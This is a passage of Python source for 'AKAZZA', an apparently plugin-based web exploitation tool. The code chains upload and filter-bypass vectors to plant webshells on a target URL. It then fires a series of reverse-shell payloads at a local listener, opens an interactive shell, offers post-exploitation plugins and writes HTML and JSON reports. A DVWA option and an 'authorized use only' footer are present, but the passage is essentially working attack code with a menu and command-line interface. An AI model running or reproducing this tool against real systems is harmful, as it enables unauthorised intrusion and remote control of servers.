        fp, chain = self.fingerprint_victim(display_url, param)
        print(f"\n{GREEN}[+]{RESET} Payload chain: {BOLD}{' → '.join(c[0] for c in chain)}{RESET}")
        self.session_log["payload_chain"] = [c[0] for c in chain]

        for attempt, (pname, pspec) in enumerate(chain, 1):
            payload = self.payload_core(pspec, ip, port)
            self.session_log["payload_method"] = pname
            print(f"\n{BOLD}{YELLOW}[{attempt}/{len(chain)}]{RESET} {BOLD}{pname}{RESET}")
            print(f"{YELLOW}  {payload[:100]}{RESET}")

            self.start_builtin_listener(ip, port, timeout=60)
            time.sleep(1)
            print(f"{YELLOW}[*]{RESET} Firing payload...")
            _cmd(payload)
            print(f"{YELLOW}[*]{RESET} Waiting for VERIFIED shell connection...")
            self.shell_event.wait(timeout=65)

            if self.shell_conn:
                print(f"\n{GREEN}[★]{RESET} {BOLD}SHELL OBTAINED via {pname}!{RESET}")
                self.post_exploitation_menu(display_url, param)
                self.interactive_shell_session(self.shell_conn)
                return True     # ← success
            self.stop_listener(); time.sleep(1)

        print(f"\n{RED}[-]{RESET} All payloads failed (triage: ip a / NAT / tools on victim)")
        return False            # ← failure: caller shows recovery menu

    # ── SELECTIVE SCAN (returns True on success) ──
    def run_selected_vectors(self, target, name_filter=None):
        self.clear_screen(); self.print_banner()
        if self.session_log["mode"] != "smart":
            self.session_log["mode"] = "selected" if name_filter else "all"
            self.session_log["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._last_filter = name_filter                    # for [r]etry
        self._auth_ok = False                             # fresh login each run
        self._current_target = target

        target = target.rstrip('/') + '/'
        origin = f"{urlparse(target).scheme}://{urlparse(target).netloc}/"
        surface = self.recon(target)

        vectors = get_phase("vector")
        if name_filter:
            vectors = [v for v in vectors if name_filter.lower() in v["name"].lower()]
            if not vectors:
                print(f"{RED}[-]{RESET} no vector plugin matching '{name_filter}'")
                self._vector_chooser(target)
                return False
            print(f"\n{CYAN}[*]{RESET} Running ONLY '{vectors[0]['name']}'")

        shell_url, param = None, None
        for plugin in vectors:
            print(f"\n{BOLD}{YELLOW}[◆]{RESET} Vector: {BOLD}{plugin['name']}{RESET} "
                  f"{MAGENTA}({plugin['cwe'] or 'n/a'}){RESET}")
            try:
                shell_url, param = plugin["fn"](self, surface, origin)
            except Exception as e:
                print(f"{RED}[vector '{plugin['name']}' crashed: {e}] — continuing{RESET}")
                shell_url, param = None, None
            if shell_url:
                print(f"{GREEN}[★]{RESET} Vector succeeded: {plugin['name']}")
                self.session_log["vector_plugin"] = {"name": plugin["name"],
                                                     "cwe": plugin["cwe"],
                                                     "attck": plugin["attck"]}
                break

        if not shell_url:
            print(f"\n{RED}[-]{RESET} All {len(vectors)} selected vector(s) exhausted.")
            # ═══ v1.10: RECOVERY — pick another exploit instead of dead-ending ═══
            self._vector_chooser(target)
            return False

        ok = self._exploit_chain(shell_url, param)
        if not ok:
            # payloads all failed → recovery menu too
            self._vector_chooser(target)
            return False
        self.post_attack_menu()
        return True

    # ── legacy full-auto ──
    def full_auto_attack(self, target=None):
        self.clear_screen(); self.print_banner()
        self.session_log["mode"] = "default"
        self.session_log["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._auth_ok = False
        if target is None:
            target = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} "
                          f"Target [{CONFIG['default_target']}]: ").strip() or CONFIG["default_target"]
        target = target.rstrip('/') + '/'
        self._current_target = target
        origin = f"{urlparse(target).scheme}://{urlparse(target).netloc}/"
        surface = self.recon(target)
        shell_url, param = None, None
        for plugin in [p for p in get_phase("vector")
                       if "upload" in p["name"].lower() and p["name"] != "Muzan"]:
            try:
                shell_url, param = plugin["fn"](self, surface, origin)
            except Exception as e:
                print(f"{RED}[vector crashed: {e}]{RESET}")
            if shell_url:
                self.session_log["vector_plugin"] = {"name": plugin["name"],
                                                     "cwe": plugin["cwe"]}
                break
        if not shell_url:
            print(f"\n{YELLOW}[!]{RESET} Upload vectors failed.")
            self._vector_chooser(target)          # v1.10: recovery instead of dead-end
            return
        if not self._exploit_chain(shell_url, param):
            self._vector_chooser(target)

    # ── post-ex menu ──
    def post_exploitation_menu(self, shell_url, param):
        while True:
            plugins = get_phase("postex")
            print(f"\n{MAGENTA}╔═══════════════════════════════════════════╗{RESET}")
            print(f"{MAGENTA}║  {WHITE}POST-EXPLOITATION{MAGENTA}                      ║{RESET}")
            print(f"{MAGENTA}╠═══════════════════════════════════════════╣{RESET}")
            for i, p in enumerate(plugins, 1):
                print(f"{MAGENTA}║{RESET}  {YELLOW}[{i}]{RESET} {p['name'][:36]:<36}{MAGENTA}║{RESET}")
            print(f"{MAGENTA}║{RESET}  {YELLOW}[{len(plugins)+1}]{RESET} Drop into shell{' ' * 20}{MAGENTA}║{RESET}")
            print(f"{MAGENTA}╚═══════════════════════════════════════════╝{RESET}")
            c = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} post-ex: ").strip()
            if c.isdigit() and 1 <= int(c) <= len(plugins):
                try:
                    plugins[int(c) - 1]["fn"](self, shell_url, param)
                except Exception as e:
                    print(f"{RED}[plugin error]{RESET} {e}")
            elif c == str(len(plugins) + 1):
                return

    # ── reports ──
    def generate_html_report(self):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"akazza_report_{ts}.html"
        s = self.session_log
        vp = s.get("vector_plugin") or {}
        assess = s.get("assessment") or []
        ranking = s.get("vector_ranking") or []
        html = f"""<!DOCTYPE html><html><head><title>AKAZZA {ts}</title><style>
body{{font-family:monospace;background:#000;color:#0f0;padding:20px}}
td,th{{border:1px solid #333;padding:6px}} th{{color:#f0f}}
.s{{background:#111;border:1px solid #333;padding:10px;margin:10px 0}}
.bar{{background:#0f0;padding:0 4px}}</style></head><body>
<h1 style="color:#f0f">AKAZZA v{self.get_version()} — SMART Report</h1>
<div class="s"><table><tr><th>Field</th><th>Value</th></tr>
<tr><td>Mode</td><td>{s.get('mode')}</td></tr>
<tr><td>Vector plugin</td><td>{vp.get('name','N/A')} ({vp.get('cwe','')})</td></tr>
<tr><td>Webshell</td><td>{s.get('target_url')}</td></tr>
<tr><td>Variant</td><td>{s.get('shell_variant')}</td></tr>
<tr><td>Verified</td><td>{s.get('shell_verified','No')}</td></tr>
<tr><td>Chain</td><td>{s.get('payload_chain')}</td></tr>
</table></div>
<div class="s"><h3>Assessment Findings</h3><table>
<tr><th>Description</th><th>Tag</th><th>Weight</th></tr>
{''.join(f"<tr><td>{a['desc']}</td><td>{a['tag']}</td><td>{a['weight']}</td></tr>" for a in assess) or '<tr><td>none</td></tr>'}
</table></div>
<div class="s"><h3>Vector Ranking</h3><table>
<tr><th>Vector</th><th>Confidence</th></tr>
{''.join(f"<tr><td>{r['name']}</td><td><span class='bar'>{'█' * int(r['score']/10)}</span> {r['score']}%</td></tr>" for r in ranking) or '<tr><td>none</td></tr>'}
</table></div>
<div class="s"><pre>FINDINGS: {json.dumps(s.get('postex_findings') or [], indent=1)}</pre></div>
<div class="s"><pre>RECON: {json.dumps(s.get('recon'), indent=1)}</pre></div>
<p style="color:#555">AKAZZA v{self.get_version()} by joyboyvoidera — authorized use only</p></body></html>"""
        open(fn, "w").write(html)
        print(f"{GREEN}[+]{RESET} HTML report: {fn}")
        return fn

    def generate_json_report(self):
        fn = f"akazza_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        json.dump(self.session_log, open(fn, "w"), indent=4)
        print(f"{GREEN}[+]{RESET} JSON report: {fn}")
        return fn

    def post_attack_menu(self):
        while True:
            c = input(f"\n{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} "
                      f"[1]HTML [2]JSON [3]summary [4]{BOLD}pick another exploit{RESET} [5]exit: ").strip()
            if c == "1": self.generate_html_report()
            elif c == "2": self.generate_json_report()
            elif c == "3": print(json.dumps(self.session_log, indent=2)[:2500])
            elif c == "4": self._vector_chooser(self._current_target)
            elif c == "5": sys.exit(0)

    # ── MAIN MENU ──
    def run(self):
        while True:
            self.clear_screen(); self.print_banner()
            nv = len(get_phase("vector")); nx = len(get_phase("postex"))
            print(f"{CYAN}┌──────────────────────────────────────────────────────────────┐{RESET}")
            print(f"{CYAN}│  {WHITE}AKAZZA v{self.get_version()} {CYAN}({nv}v/{nx}x) — plugin edition             {CYAN}  {CYAN}│{RESET}")
            print(f"{CYAN}├──────────────────────────────────────────────────────────────┤{RESET}")
            print(f"{CYAN}│  {RED}[1]{RESET} {BOLD}SMART MODE{RESET}{CYAN} — assess, rank, recommend, attack     {CYAN}│{RESET}")
            print(f"{CYAN}│  {RED}[2]{RESET} {BOLD}MUZAN{RESET}{CYAN} (plugin — asks for target URL)       {CYAN}│{RESET}")
            print(f"{CYAN}│  {RED}[3]{RESET} {BOLD}Bypass Inspection Filter{RESET}{CYAN} (DVWA Impossible)  {CYAN}│{RESET}")
            print(f"{CYAN}│  {YELLOW}[4]{RESET} Default full-auto (upload fuzz)         {CYAN}│{RESET}")
            print(f"{CYAN}│  {YELLOW}[5]{RESET} PHP upload-to-RCE tester                 {CYAN}│{RESET}")
            print(f"{CYAN}│  {YELLOW}[6]{RESET} Choose plugin (blank = ALL vectors)      {CYAN}│{RESET}")
            print(f"{CYAN}│  {YELLOW}[7]{RESET} Manual (existing webshell URL)            {CYAN}│{RESET}")
            print(f"{CYAN}│  {YELLOW}[8]{RESET} List plugins  [9] Exit                   {CYAN}│{RESET}")
            print(f"{CYAN}└──────────────────────────────────────────────────────────────┘{RESET}\n")
            c = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} option: ").strip()
            if c == "1": self.smart_attack(); return
            elif c == "2":
                self.session_log["mode"] = "Muzan"
                self.session_log["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                self._auth_ok = False
                self.run_selected_vectors(CONFIG["default_target"],
                                          name_filter="Muzan")
                return
            elif c == "3":
                t = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} "
                          f"Target [{CONFIG['default_target']}]: ").strip() or CONFIG["default_target"]
                self.session_log["mode"] = "selected"
                self.run_selected_vectors(t, name_filter="Bypassing Inspection Filter")
                return
            elif c == "4": self.full_auto_attack(); return
            elif c == "5":
                t = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} "
                          f"Target [{CONFIG['default_target']}]: ").strip() or CONFIG["default_target"]
                self.session_log["mode"] = "default"
                self.run_selected_vectors(t, name_filter="PHP upload-to-RCE")
                return
            elif c == "6":
                vectors = get_phase("vector")
                if not vectors:
                    print(f"{RED}[!]{RESET} no vector plugins loaded"); continue
                for i, p in enumerate(vectors, 1):
                    print(f"  {YELLOW}[{i}]{RESET} {p['name']}")
                n = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} vector # (blank=ALL): ").strip()
                t = input(f"Target [{CONFIG['default_target']}]: ").strip() or CONFIG["default_target"]
                self.session_log["mode"] = "selected" if n else "all"
                if not n:
                    self.run_selected_vectors(t, name_filter=None)
                else:
                    try:
                        chosen = vectors[int(n) - 1]["name"]
                    except (ValueError, IndexError):
                        print(f"{RED}[!]{RESET} bad choice"); continue
                    self.run_selected_vectors(t, name_filter=chosen)
                return
            elif c == "7":
                su = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} Webshell URL: ").strip()
                if su:
                    p = input(f"Param [{CONFIG['shell_param']}]: ").strip() or CONFIG["shell_param"]
                    self.session_log["mode"] = "manual"
                    self.session_log["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    if not self._exploit_chain(su, p):
                        self._vector_chooser(su.rsplit('/', 1)[0])
                return
            elif c == "8":
                for phase in ("vector", "postex"):
                    print(f"\n{MAGENTA}{phase}:{RESET}")
                    for p in get_phase(phase):
                        tags = ",".join(p["wants"] or [])
                        print(f"  [{p['priority']:>2}] {p['name']}  {p['cwe'] or ''} "
                              f"{p['attck'] or ''}  wants:[{tags}]")
                input(f"\n{YELLOW}ENTER...{RESET}")
            elif c == "9": sys.exit(0)
            else: print(f"{RED}[!]{RESET} Invalid option")


if __name__ == "__main__":
    load_plugins()
    tool = Akazza()
    if len(sys.argv) > 1:
        if sys.argv[1] in ("--help", "-h"):
            print(f"""
AKAZZA v{tool.get_version()} by joyboyvoidera — SMART PLUGIN EDITION

  python3 akazza.py                       # menu
  python3 akazza.py --smart [URL]         # SMART: assess → rank → [p]ick → attack
  python3 akazza.py --muzan               # MUZAN plugin (asks for target URL itself)
  python3 akazza.py --bypass-filter [URL] # ONLY the inspection-filter bypass
  python3 akazza.py --auto  [URL]         # default: recon + upload-fuzz vectors
  python3 akazza.py --php-upload [URL]    # ONLY the PHP upload-to-RCE tester
  python3 akazza.py --one <name> [URL]    # run one arbitrary plugin (name substring)
  python3 akazza.py --list-plugins        # show the registry + evidence tags
  python3 akazza.py --report

  On ANY failed vector → recovery menu appears: pick another exploit,
  retry last, run all, re-SMART, manual URL, or change target — no restart.
""")
        elif sys.argv[1] == "--smart":
            tool.smart_attack(target=sys.argv[2] if len(sys.argv) > 2 else None)
        elif sys.argv[1] == "--muzan":
            tool.session_log["mode"] = "Muzan"; tool._auth_ok = False
            tool.run_selected_vectors(CONFIG["default_target"], name_filter="Muzan")
        elif sys.argv[1] == "--bypass-filter":
            tool.session_log["mode"] = "selected"
            tool.run_selected_vectors(
                sys.argv[2] if len(sys.argv) > 2 else CONFIG["default_target"],
                name_filter="Bypassing Inspection Filter")
        elif sys.argv[1] == "--auto":
            tool.full_auto_attack(target=sys.argv[2] if len(sys.argv) > 2 else None)
        elif sys.argv[1] == "--php-upload":
            tool.session_log["mode"] = "default"
            tool.run_selected_vectors(
                sys.argv[2] if len(sys.argv) > 2 else CONFIG["default_target"],
                name_filter="PHP upload-to-RCE")
        elif sys.argv[1] == "--one":
            pname = sys.argv[2] if len(sys.argv) > 2 else None
            purl  = sys.argv[3] if len(sys.argv) > 3 else CONFIG["default_target"]
            if pname:
                tool.session_log["mode"] = "selected"
                tool.run_selected_vectors(purl, name_filter=pname)
            else:
                print("usage: --one <substring-of-plugin-name> [URL]")
        elif sys.argv[1] == "--list-plugins":
            for phase in ("vector", "postex"):
                print(f"{MAGENTA}{phase}:{RESET}")
                for p in get_phase(phase):
                    tags = ",".join(p["wants"] or [])
                    print(f"  [{p['priority']:>2}] {p['name']}  {p['cwe'] or ''} "
                          f"{p['attck'] or ''}  wants:[{tags}]")
        elif sys.argv[1] == "--report":
            tool.session_log["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            tool.generate_html_report()
        else:
            print(f"Unknown option: {sys.argv[1]} — use --help")
    else:
        tool.run()
